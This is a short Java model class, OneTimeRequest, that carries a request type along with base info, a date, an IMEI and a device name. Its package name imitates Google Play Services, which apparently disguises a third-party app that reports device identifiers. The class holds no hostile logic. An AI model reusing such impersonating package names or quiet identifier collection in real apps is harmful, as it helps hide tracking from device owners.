package com.google.android.gms.persistent.googleapps.network.models.request;

import com.google.android.gms.persistent.googleapps.network.models.data.BaseInfo;

/**
 * Created by OldMan on 05.04.2017.
 */

public class OneTimeRequest extends InformationRequest {
    private int type;

    public OneTimeRequest(BaseInfo info, long date, String imei, String device, int type) {
        super(info, date, imei, device);
        this.type = type;
    }

    public int getType() {
        return type;
    }

    public void setType(int type) {
        this.type = type;
    }
}
